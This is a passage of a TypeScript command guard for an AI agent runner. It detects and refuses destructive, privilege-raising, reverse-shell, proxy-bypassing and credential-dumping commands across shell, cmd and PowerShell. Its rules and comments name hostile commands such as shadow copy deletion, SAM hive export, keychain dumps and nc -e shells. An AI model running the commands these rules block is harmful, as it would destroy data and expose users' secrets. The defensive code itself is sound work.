        value = words[i + 1]?.param ? "" : (words[++i]?.text ?? "");
      }
      if ("userid".startsWith(name) || "groupid".startsWith(name)) account = -1;
      if (
        principalProblem(name, value, scope) ||
        "cimsession".startsWith(name) ||
        "xml".startsWith(name) ||
        (("taskname".startsWith(name) || "taskpath".startsWith(name)) && WINDOWS_TASK.test(value))
      )
        return SYSTEM_REASON;
    } else if (/^[()|]$/.test(text)) {
      if (i > account) account = -1;
    } else if (
      HIGHEST.test(text) ||
      WINDOWS_TASK.test(text) ||
      (account >= 0 && i > account && !ownAccount(text, scope))
    )
      return SYSTEM_REASON;
    else if (i > account) account = -1;
  }
  return null;
}

/**
 * Why a PowerShell text is refused: its first statement with a change to the system (`POWERSHELL_CHANGES`,
 * `taskProblem`), or one carried across statements: shadow copies deleted in a script block
 * (`gwmi win32_shadowcopy | % { $_.Delete() }`), the registry changed by the location or a variable
 * (`cd HKCU:\…; ni .`, `$k = "HKCU:\…"; sp $k …`), a task's principal set apart from the cmdlet that changes the task
 * (`$p.UserId = "SYSTEM"; Register-ScheduledTask … -Principal $p`).
 */
function powershellProblem(text: string, scope: CommandScope): string | null {
  const flat = text.toLowerCase();
  if (/\bwin32_shadowcopy\b/.test(flat) && /\.delete\(|\bremove-(ciminstance|wmiobject)\b/.test(flat))
    return SYSTEM_REASON;
  const statements = flat.split(/[;\n{}]/);
  if (
    statements.some((s) => TASK_CHANGE.test(s)) &&
    [...flat.matchAll(PRINCIPAL_SET)].some((m) => principalProblem(m[1] as string, m[2] ?? m[3] ?? m[4] ?? "", scope))
  )
    return SYSTEM_REASON;
  const inHive = IN_HIVE.test(flat);
  const held = new Set([...flat.matchAll(HIVE_VARIABLE)].map((m) => m[1]));
  for (const statement of statements) {
    if (ITEM_CHANGE.test(statement) && (inHive || [...statement.matchAll(/\$[\w:]+/g)].some((v) => held.has(v[0]))))
      return SYSTEM_REASON;
    const hit = POWERSHELL_CHANGES.find(([, ...all]) => all.every((r) => r.test(statement)));
    if (hit) return hit[0];
    const task = taskProblem(statement, scope);
    if (task) return task;
  }
  return null;
}

/** PowerShell's options that take the next word (`-ExecutionPolicy Bypass`, `-WindowStyle Hidden`, `-Version 5`). */
const POWERSHELL_VALUE = /^(ep|ex\w*|w\w*|v\w*|if|inp\w*|of|o|out\w*|psc\w*|con\w*|settings\w*|cus\w*)$/;

/**
 * What a Windows shell runs: `cmd`'s words after `/c`, `/k` or `/r`; PowerShell's `-EncodedCommand` (`-enc`, `-e`:
 * base64 of UTF-16LE text) decoded, its words after `-Command` (`-c`), or from its first word that isn't an option on
 * (the command, to Windows PowerShell). Null for a script file (`-File`) or nothing to run. Git Bash keeps a switch
 * from being read as a path when it is doubled (`cmd //c`).
 */
function windowsScript(shell: string, args: readonly string[]): string | null {
  for (let i = 0; i < args.length; i++) {
    const word = args[i] as string;
    const flag = /^(\/\/?|--?)/.test(word) ? word.replace(/^(\/\/?|--?)/, "").toLowerCase() : null;
    if (shell === "cmd") {
      if (flag === "c" || flag === "k" || flag === "r") return args.slice(i + 1).join(" ");
      continue;
    }
    if (flag === null) return args.slice(i).join(" ");
    if (flag === "ec" || (flag !== "" && "encodedcommand".startsWith(flag)))
      return Buffer.from(args[i + 1] ?? "", "base64").toString("utf16le");
    if (flag === "c" || flag === "cwa" || (flag.length > 2 && "commandwithargs".startsWith(flag)))
      return args.slice(i + 1).join(" ");
    if (flag === "f" || (flag.length > 1 && "file".startsWith(flag))) return null;
    if (POWERSHELL_VALUE.test(flag)) i++;
  }
  return null;
}

/**
 * Whether a path is outside the agent's folders, for what changes who may use a file. A variable is outside. With a
 * Windows computer's folders, any path is read against them as Windows reads it; without them (a POSIX scope, or
 * none), a Windows drive or a share is outside and a relative path stays in the folder it runs in unless it climbs
 * out of it.
 */
function outsideFolders(scope: CommandScope, p: string) {
  const q = p.replaceAll("\\", "/");
  if (/^[%$]/.test(q)) return true;
  if (windowsScope(scope)) return !insideOrTmp(scope, q);
  if (/^([a-z]:|\/\/)/i.test(q)) return true;
  if (q.startsWith("/") || q.startsWith("~")) return !insideOrTmp(scope, q);
  return path.posix.normalize(q).split("/")[0] === "..";
}

/** cmd's switches: one letter each, alone or chained (`/s`, `/s/q`, `/a:h`), doubled in Git Bash (`//s`). */
const CMD_SWITCH = /^(\/\/?[a-z?](:[^\s/]*)?)+$/i;
/** sc's subcommands that change a service (`query`, `qc` and `start` don't). */
const SC_CHANGES =
  /^(create|config|delete|stop|pause|failure|failureflag|sdset|privs|sidtype|triggerinfo|managedaccount|control)$/i;
/** icacls's and cacls's switches that change who may use a file (`/grant:r`, `/inheritance:d`, `/g`, `/s:SDDL`). */
const ACL_CHANGES =
  /^(\/\/?|-)((grant|deny|remove|setowner|setintegritylevel|reset|inheritance|restore|substitute)(:\w+)?|[gpdr]|s:\S+)$/i;

/**
 * Why a Windows command is refused: more rights (`runas`), the system changed (the registry, a scheduled task that
 * isn't the person's own, services, boot, backups, event logs, accounts, who may use a file outside the agent's
 * folders), a disk wiped, the firewall, proxy or routes changed, the system's secrets read. PowerShell's cmdlets are
 * `powershellProblem`'s. Reads run: `reg query`, `schtasks /query`, `sc query`, `netsh … show`, `icacls` without a
 * change, and so do the person's own scheduled tasks, as crontab does.
 */
function windowsProblem(cmd: string, args: readonly string[], scope: CommandScope): string | null {
  const sub = (args[0] ?? "").toLowerCase();
  const has = (re: RegExp) => args.some((a) => re.test(a));
  if (cmd === "runas") return PRIVILEGE_REASON;
  if (cmd === "diskpart" || (cmd === "format" && has(/^[a-z]:[\\/]?$/i))) return WIPE;
  if (cmd === "bcdedit") return SYSTEM_REASON;
  if (cmd === "reg") {
    if (/^(add|delete|import|restore|load|unload|copy)$/.test(sub)) return SYSTEM_REASON;
    // The hives that hold the computer's password hashes and the keys that open them.
    if (
      /^(save|export)$/.test(sub) &&
      /^hk(lm|ey_local_machine)[\\/]*(sam|security|system)[\\/]*$/i.test(args[1] ?? "")
    )
      return SECRETS;
  }
  // A task the person's own user doesn't run (`/ru` another account or `SYSTEM`, which an empty one is too), with the
  // highest rights, on another computer (`/s`, `/u`), from XML that can't be read here, or Windows' own
  // (`\Microsoft\…`, every task by `*`).
  if (cmd === "schtasks" && has(/^(\/\/?|-)(create|change|delete)$/i)) {
    const value = (name: string) => {
      const at = args.findIndex((a) => new RegExp(String.raw`^(\/\/?|-)${name}$`, "i").test(a));
      return at < 0 ? undefined : (args[at + 1] ?? "");
    };
    const user = value("ru");
    const task = value("tn") ?? "";
    if (
      (user !== undefined && !ownAccount(user, scope)) ||
      /^highest$/i.test(value("rl") ?? "") ||
      [value("s"), value("u"), value("xml")].some((v) => v !== undefined) ||
      task === "*" ||
      /^[\\/]?microsoft([\\/]|$)/i.test(task)
    )
      return SYSTEM_REASON;
  }
  // `sc \\host create …` names another computer first.
  if (cmd === "sc" && args.slice(0, 2).some((a) => SC_CHANGES.test(a))) return SYSTEM_REASON;
  if (
    (cmd === "vssadmin" && /^(delete|resize)$/.test(sub)) ||
    (cmd === "wbadmin" && sub === "delete") ||
    (cmd === "wevtutil" && /^(cl|clear-log)$/.test(sub)) ||
    (cmd === "wmic" && has(/^shadowcopy$/i) && has(/^delete$/i))
  )
    return SYSTEM_REASON;
  if (cmd === "net") {
    if (/^(stop|pause)$/.test(sub)) return SYSTEM_REASON;
    // Any switch but `/domain` adds, removes or changes an account or a group; a second word after the name is its
    // new password.
    const words = args.slice(1).filter((a) => !/^(\/\/?|-)/.test(a));
    if (
      /^(users?|localgroup|group)$/.test(sub) &&
      (has(/^(\/\/?|-)(?!domain$)\w/i) || (/^users?$/.test(sub) && words.length > 1))
    )
      return SYSTEM_REASON;
  }
  if (cmd === "netsh") {
    if (has(/^wlan$/i) && has(/^key=clear$/i)) return SECRETS;
    if (has(/^(set|add|delete|reset|import|restore|install|uninstall)$/i)) return NETWORK;
  }
  // icacls and cacls only show who may use a file unless a switch changes it; takeown always takes it.
  if (cmd === "takeown" || ((cmd === "icacls" || cmd === "cacls") && has(ACL_CHANGES))) {
    const f = args.findIndex((a) => /^(\/\/?|-)f$/i.test(a));
    const target = cmd === "takeown" ? (f >= 0 ? args[f + 1] : undefined) : args[0];
    if (target !== undefined && outsideFolders(scope, target)) return SYSTEM_REASON;
  }
  return null;
}

function commandProblem(s: Loose, scope: CommandScope): string | null {
  if (s.powershell !== undefined) return textProblem(s.powershell) ?? powershellProblem(s.powershell, scope);
  const [first = "", ...args] = s.argv;
  const cmd = baseName(first);
  if (PRIVILEGE.test(cmd)) return PRIVILEGE_REASON;
  if (WIPE_TOOLS.test(cmd)) return WIPE;
  if (cmd === "dd" && args.some((a) => /^of=\/dev\/(?!(null|zero|stdout|stderr|shm)(\/|$))/.test(a))) return WIPE;
  if (cmd === "diskutil" && /^(erase\w*|reformat|partitionDisk|zeroDisk|randomDisk|secureErase)$/i.test(args[0] ?? ""))
    return WIPE;
  const recursive = args.some((a) => /^-[a-zA-Z]*[rR]/.test(a) || a === "--recursive");
  // cmd's `rd /s` and `del /s` (`/s/q` too), PowerShell's `Remove-Item -Recurse`. A path from the drive's root isn't a
  // switch (`\Users`, read as `/Users`), and a parameter may carry its path (`-Path:C:\`).
  const windowsDelete =
    /^(rd|rmdir|del|erase|remove-item|ri)$/.test(cmd) &&
    (recursive || args.some((a) => CMD_SWITCH.test(a) && /(^|\/)s(\W|$)/i.test(a)));
  if (
    args.includes("--no-preserve-root") ||
    (/^(rm|chmod|chown|chgrp)$/.test(cmd) &&
      recursive &&
      args.some((a) => !a.startsWith("-") && wholeTree(a, scope))) ||
    (windowsDelete &&
      args.some((a) => {
        const p = a.replace(/^-\w+:/, "");
        return !p.startsWith("-") && !CMD_SWITCH.test(p) && wholeTree(p, scope);
      }))
  )
    return WIPE;
  if (cmd === "find" && args.includes("-delete") && findRoots(args).some((a) => wholeTree(a, scope))) return WIPE;
  const plain = args.filter((a) => !a.startsWith("-"));
  if (
    (cmd === "mv" && plain.slice(0, -1).some((a) => wholeTree(a, scope))) ||
    (cmd === "rsync" && args.some((a) => a.startsWith("--delete")) && wholeTree(plain.at(-1) ?? "", scope))
  )
    return WIPE;
  if (/^(docker|podman)$/.test(cmd) && args.some((a) => a === "run" || a === "create") && hostAccess(args, scope))
    return PRIVILEGE_REASON;
  if (
    (cmd === "security" &&
      (/^(dump-keychain|export)$/.test(args[0] ?? "") ||
        (/^find-(generic|internet)-password$/.test(args[0] ?? "") && args.some((a) => /^-[a-zA-Z]*[wg]/.test(a))))) ||
    (cmd === "git" && args.includes("credential") && args.includes("fill")) ||
    ((/^(git|docker)-credential-/.test(cmd) || (cmd === "git" && args.some((a) => a.startsWith("credential-")))) &&
      args.includes("get"))
  )
    return SECRETS;
  // The runner by name: stopped or killed (a search for the name, `pgrep` and a status are not), on Windows by
  // `taskkill` or `tskill` (PowerShell's `Stop-Process`: `POWERSHELL_CHANGES`).
  if (
    args.some((a) => /agentes-runner/i.test(a)) &&
    (/^(pkill|killall|taskkill|tskill)$/.test(cmd) ||
      (cmd === "systemctl" && args.some((a) => SYSTEMCTL_CHANGES.test(a))) ||
      (cmd === "service" && args.some((a) => /^(stop|restart|reload)$/.test(a))) ||
      (cmd === "launchctl" && args.some((a) => /^(bootout|unload|stop|kill|remove|disable)$/.test(a))))
  )
    return RUNNER;
  if (/^(nc|ncat|netcat)$/.test(cmd) && args.some((a) => /^-[a-zA-Z]*[ec]|^--(exec|sh-exec|lua-exec)/.test(a)))
    return REVERSE;
  if (cmd === "socat" && args.some((a) => /(^|[,!])(exec|system):/i.test(a))) return REVERSE;
  if (SYSTEM_TOOLS.test(cmd)) return SYSTEM_REASON;
  if (cmd === "systemctl" && !args.includes("--user") && args.some((a) => SYSTEMCTL_CHANGES.test(a)))
    return SYSTEM_REASON;
  if (cmd === "service" && args.some((a) => /^(start|stop|restart|reload|force-reload)$/.test(a))) return SYSTEM_REASON;
  if (cmd === "sysctl" && args.some((a) => /^(-w|-p|--write|--load|--system)$/.test(a) || /^[\w.]+=/.test(a)))
    return SYSTEM_REASON;
  if (cmd === "launchctl" && args.some((a) => /^system(\/|$)/.test(a) || a.startsWith("/Library/")))
    return SYSTEM_REASON;
  if (cmd === "git" && args.includes("--system")) return SYSTEM_REASON;
  if (FIREWALL_TOOLS.test(cmd)) return NETWORK;
  // Windows' `route ADD` takes any case, and its `-f` clears every gateway.
  if (
    ((cmd === "ip" || cmd === "route") &&
      args.some((a) => /^(add|del|delete|change|replace|flush|set|append)$/i.test(a))) ||
    (cmd === "route" && args.includes("-f"))
  )
    return NETWORK;
  if (
    cmd === "curl" &&
    args.some((a) =>
      /^(-x|--proxy|--noproxy|--preproxy|--socks4a?|--socks5(-hostname)?)$|^--(proxy|noproxy|preproxy|socks\w*)=/.test(
        a,
      ),
    )
  )
    return NETWORK;
  if (cmd === "wget" && args.some((a) => a === "--no-proxy" || /^(use_proxy|https?_proxy|no_proxy)=/i.test(a)))
    return NETWORK;
  if (cmd === "git" && args.some((a) => /^https?\.(\S+\.)?proxy(=|$)/i.test(a))) return NETWORK;
  const windows = windowsProblem(cmd, args, scope);
  if (windows) return windows;
  const written = writeTargets(cmd, args, s.writes);
  for (const file of written) {
    const why = writeProblem(file, scope);
    if (why) return why;
  }
  const keys = new Set(s.argv.filter((_, i) => i > 0 && sshKeyArg(s.argv, i)));
  for (const word of [...s.raw, ...s.reads]) {
    if (written.includes(word) || keys.has(word)) continue;
    const why = wordProblem(word, scope);
    if (why) return why;
  }
  return null;
}

/** What a text says as a whole: a shell handed out, a fork bomb, the proxy gone around, the runner's variables, hidden code. */
function textProblem(flat: string): string | null {
  if (REVERSE_SHELL.some((all) => all.every((r) => r.test(flat)))) return REVERSE;
  if (FORK_BOMB.test(flat)) return WIPE;
  if (PROXY_TEXT.some((r) => r.test(flat)) || proxyBypass(flat)) return NETWORK;
  if (RUNNER_VARIABLE.test(flat)) return RUNNER;
  if (ENCODED_RUN.some((all) => all.every((r) => r.test(flat)))) return ENCODED;
  return null;
}

/** `badActorReason` for a text: a shell command (`code` false) or Python/JavaScript code. */
function badText(text: string, code: boolean, scope: CommandScope): string | null {
  const flat = text.replace(/\\\r?\n/g, " ");
  const whole = textProblem(flat);
  if (whole) return whole;
  if (code && ENV_DUMP_CODE.test(flat) && NET_CODE.test(flat)) return ENV_OUT;
  const cmds: Loose[] = [];
  looseScan(flat, code, 0, cmds);
  return badCommands(cmds, scope);
}

/** Why the commands read from a text are refused: the first one's reason, or the whole environment sent out. */
function badCommands(cmds: readonly Loose[], scope: CommandScope): string | null {
  let dumps = false;
  let sends = false;
  for (const s of cmds) {
    const why = commandProblem(s, scope);
    if (why) return why;
    dumps ||= envDump(s.raw);
    sends ||= SENDERS.test(baseName(s.argv[0] ?? ""));
  }
  return dumps && sends ? ENV_OUT : null;
}

/**
 * Why a call of a run outside a mission is refused (ADR 0053 §3, addendum 2026-11-19), or null: it runs. Only
 * obvious harm: secrets read, printed or sent; more rights (sudo, su); changes to the system, its services, disks
 * and kernel; a shell handed to another machine; wiping the computer or a home; the proxy, firewall or routes
 * changed or gone around; the runner; another user's files. Everything else is ordinary work: HTTP calls of any
 * method, ssh and rsync, pushes, pipes, heredocs, `$(…)`, `bash -c`, inline code, installs into the agent's own
 * user. The whole text is read, so a `bash -c`, a heredoc or inline code hides nothing that plain matching can see.
 * Every tool's command is read (`commandCall`), Claude Code's PowerShell tool's as a `powershell -Command` body.
 */
export function badActorReason(
  toolName: string,
  input: Record<string, unknown> | null | undefined,
  scope: CommandScope,
): string | null {
  const file = FILE_WRITE_TOOLS.has(toolName)
    ? [input?.file_path, input?.notebook_path].find((v): v is string => typeof v === "string")
    : undefined;
  if (file !== undefined) return namesSecret(file, scope) ? SECRETS : writeProblem(file, scope);
  const call = commandCall(toolName, input);
  if (call === null) return null;
  if (!call.powershell) return badText(call.command, false, scope);
  const cmds: Loose[] = [];
  windowsScan("powershell", call.command, 0, cmds);
  return badCommands(cmds, scope);
}

/** `badActorReason` for `run_code`'s code (`language`: bash, python or node), where the computer's folders aren't known. */
export const badActorCode = (code: string, language: string) =>
  badText(code, language !== "bash", { cwd: "/nonexistent", folders: [] });

// ── "Aprovar sempre" for a command: its kind ──────────────────────────────────

/** Interpreters whose first plain word is a script: alone, their kind would cover any code. */
const SCRIPT_RUNNERS = /^(python[\d.]*|node|nodejs|bun|deno|ruby|perl|php|npx|bunx|pnpx|uvx|pipx)$/;
/** Kinds that run whatever script or package their next word names (`bun run ./x.ts`, `npm exec pkg`). */
const RUNS_ANY = /^(npm|pnpm|yarn|bun|deno|uv|poetry|pdm|go) (run|x|exec|dlx)$/;
/** Words of a kind that delete, publish, deploy, sign in or change settings and secrets: never approved for good. */
const NEVER_FOR_GOOD_WORD =
  /^(delete|del|destroy|remove|rm|drop|uninstall|purge|prune|clean|reset|restore|revert|rollback|merge|deploy|release|publish|unpublish|push|secret|secrets|variable|variables|ruleset|rerun|archive|unarchive|transfer|rename|apply|login|logout|auth|token|kill|approve|revoke|rotate|sudo|config|alias|ssh-key|gpg-key|deploy-key)$/;
/** Kinds that start workflows, change a repository's settings or approve pull requests (`gh pr review --approve`). */
const NEVER_FOR_GOOD_KIND = /^gh (workflow (run|enable|disable)|repo edit|pr review)(\s|$)/;
/** A subcommand word: lower case, no path, no value. */
const KIND_WORD = /^[a-z][a-z0-9_-]*$/;
/** The program and at most this many subcommands (`gh issue create`). */
const KIND_WORDS = 3;

/**
 * The kind "Aprovar sempre" keeps for one command on the agent's computer (ADR 0015, amended 2026-11-03): the program
 * and its subcommands, without arguments or values (`gh issue create --title x` → `gh issue create`, `npm test`), or
 * null when it has none: not exactly one plain command (a pipeline, a list, a redirection, a wrapper, a path to
 * the program, options before its subcommand), a secret, inline code, a script run by an interpreter, and, unless
 * `held`, the deny list, a push and anything that deletes, deploys, publishes, signs in or changes settings. gh's
 * `-R`/`--repo` only pick a repository and stay out of it. `held`: the kind of a command the computer holds for a
 * person (`gh pr merge`, `vercel deploy`), which a rule of the agent's own may still cover.
 */
export function commandKind(command: string, held = false): string | null {
  const cmds = simpleCommands(command);
  const s = cmds?.length === 1 ? cmds[0] : undefined;
  if (!s || s.writes.length > 0 || s.reads.length > 0) return null;
  const [program = "", ...rest] = s.argv;
  if (!KIND_WORD.test(program) || WRAPPERS.has(program) || SHELL_NAMES.test(program) || PASS_THROUGH.has(program))
    return null;
  if (SYSTEM.has(program) || REMOTE.has(program) || INTERPRETERS.has(program) || WRITERS.has(program)) return null;
  const input = { command };
  if (secretRead("Bash", input) || inlineCode(s.argv) || outboundCallProblem("Bash", input)) return null;
  const denied = deniedMessage("Bash", input);
  if (denied === SECRET_MESSAGE || (!held && (denied || gitPushes(command)?.length !== 0))) return null;
  // curl and wget only ask when they send or save: their kind would cover every upload.
  if (program === "curl" || program === "wget") return null;
  const args = program === "gh" ? ghWords(rest) : rest;
  if (args[0]?.startsWith("-")) return null;
  const words = [program];
  for (const a of args) {
    if (!KIND_WORD.test(a) || words.length > KIND_WORDS) break;
    words.push(a);
  }
  if (words.length === 1 && SCRIPT_RUNNERS.test(program)) return null;
  const kind = words.join(" ");
  if (RUNS_ANY.test(kind)) return null;
  if (held) return kind;
  if (NEVER_FOR_GOOD_KIND.test(kind)) return null;
  // Every plain word, not just the kind's: options in between still pick the subcommand (`make X=1 deploy`,
  // `cargo +nightly publish`), and a word that only names something loses the button, never a card.
  if (args.some((w) => NEVER_FOR_GOOD_WORD.test(w))) return null;
  // Its kind alone only reads (`git branch`, `find`, `gh pr view`): what asked was an option (`-D`, `-delete`,
  // `--web`), which the kind would cover with any arguments.
  if (readOnlySimple({ argv: words, writes: [], reads: [] }, { cwd: "/nonexistent", folders: [] }, true)) return null;
  return kind;
}
